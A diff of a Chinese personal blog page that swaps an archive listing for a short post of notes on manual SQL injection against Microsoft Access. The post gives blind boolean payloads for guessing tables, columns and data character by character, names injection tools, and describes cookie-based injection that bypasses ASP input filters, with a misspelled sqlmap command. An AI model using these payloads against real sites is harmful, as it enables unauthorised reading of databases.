@@ -5,18 +5,23 @@
   
 
   
-  <title>归档 | Tahm&#39;s blog</title>
+  <title>Access手工注入 | Tahm&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Tahm&#39;s blog">
-<meta property="og:url" content="https://pjun666.github.io/archives/page/2/index.html">
+  <meta name="description" content="1.手工注入(暴力猜解) 表名：id=1 and exists(select * from 表名) 列名：id=1 and exists(select 列名 from 表名) 列中内容长度：id=1 and (select top 1 len(列名) from 表名) &amp;gt; 3 列中内容的每个字符：id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Access手工注入">
+<meta property="og:url" content="https://pjun666.github.io/2019/03/16/Access手工注入/index.html">
 <meta property="og:site_name" content="Tahm&#39;s blog">
+<meta property="og:description" content="1.手工注入(暴力猜解) 表名：id=1 and exists(select * from 表名) 列名：id=1 and exists(select 列名 from 表名) 列中内容长度：id=1 and (select top 1 len(列名) from 表名) &amp;gt; 3 列中内容的每个字符：id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-16T11:49:23.983Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tahm&#39;s blog">
+<meta name="twitter:title" content="Access手工注入">
+<meta name="twitter:description" content="1.手工注入(暴力猜解) 表名：id=1 and exists(select * from 表名) 列名：id=1 and exists(select 列名 from 表名) 列中内容长度：id=1 and (select top 1 len(列名) from 表名) &amp;gt; 3 列中内容的每个字符：id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)">
   
     <link rel="alternate" href="/atom.xml" title="Tahm&#39;s blog" type="application/atom+xml">
   
@@ -51,150 +56,88 @@
   </div>
 </header>
       <div id="middlecontent" title class="global-width sidebar-right">
-        <section id="main">
+        <section id="main"><article id="post-Access手工注入" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="global-container archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
+    <header class="article-header">
       
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/04/今天又是充满希望的一天/">今天又是充满希望的一天</a>
+    <h1 class="article-title" itemprop="name">
+      Access手工注入
     </h1>
   
-      
-    </header>
-    <div class="article-meta archive-article-meta">
-      <a href="/2018/12/04/今天又是充满希望的一天/" class="article-date">
-  <time datetime="2018-12-04T14:03:07.000Z" itemprop="datePublished">2018-12-04</time>
-</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/我想静静/">我想静静</a></li></ul>
 
-    </div>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/04/httpd/">Linux 源码安装Apache</a>
-    </h1>
-  
-      
     </header>
-    <div class="article-meta archive-article-meta">
-      <a href="/2018/12/04/httpd/" class="article-date">
-  <time datetime="2018-12-04T07:00:52.000Z" itemprop="datePublished">2018-12-04</time>
+  
+  <div class="article-meta">
+    <a href="/2019/03/16/Access手工注入/" class="article-date">
+  <time datetime="2019-03-16T11:48:34.000Z" itemprop="datePublished">2019-03-16</time>
 </a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
+    
+    
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
 
-    </div>
   </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/04/我的心情日记/">我的心情日记</a>
-    </h1>
-  
-      
-    </header>
-    <div class="article-meta archive-article-meta">
-      <a href="/2018/12/04/我的心情日记/" class="article-date">
-  <time datetime="2018-12-04T03:14:41.000Z" itemprop="datePublished">2018-12-04</time>
-</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/我想静静/">我想静静</a></li></ul>
 
-    </div>
-  </div>
-</article>
-  
+  <div class="article-inner">
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
+    <div class="article-content article-content-doorframe" itemprop="articleBody">
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/04/Myfirstblog/">我的第一篇博客</a>
-    </h1>
-  
-      
-    </header>
-    <div class="article-meta archive-article-meta">
-      <a href="/2018/12/04/Myfirstblog/" class="article-date">
-  <time datetime="2018-12-04T03:08:10.000Z" itemprop="datePublished">2018-12-04</time>
-</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/我想静静/">我想静静</a></li></ul>
+        <p>1.手工注入(暴力猜解)</p>
+<p>表名：<br>id=1 and exists(select * from 表名)</p>
+<p>列名：<br>id=1 and exists(select 列名 from 表名)</p>
+<p>列中内容长度：<br>id=1 and (select top 1 len(列名) from 表名) &gt; 3</p>
+<p>列中内容的每个字符：<br>id=1 and (select top 1 asc(mid(列名,1,1)) from 表名) &gt; 96</p>
+<p>2.工具注入<br>穿山甲、明小子、啊D、SQLMap</p>
+<p>3.中转注入（Cookie注入）<br>中转注入为cookie注入的一种手法，这种攻击手法常见于asp搭配数据库的情况，当asp脚本中有对传入的数据进行检测过滤时，只对post和get方法所获取的数据进行检查，而没有对cookie检查，可以在cookie中加入你的sql注射攻击代码，从而绕过asp检测脚本而对数据库进行攻击<br>salmap –cookie “id=1” –leval 3</p>
 
-    </div>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/04/hello-world/">Hello World</a>
-    </h1>
-  
-      
-    </header>
-    <div class="article-meta archive-article-meta">
-      <a href="/2018/12/04/hello-world/" class="article-date">
-  <time datetime="2018-12-04T02:46:57.161Z" itemprop="datePublished">2018-12-04</time>
-</a>
-      
       
     </div>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-
-  <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/archives/">&laquo; 上一页</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span>
-  </nav>
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2019/03/16/SQLMap笔记/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">SQLMap笔记</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
 
+    
+<div id="gitmentContainer"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
 </section>
         <aside id="sidebar">
   
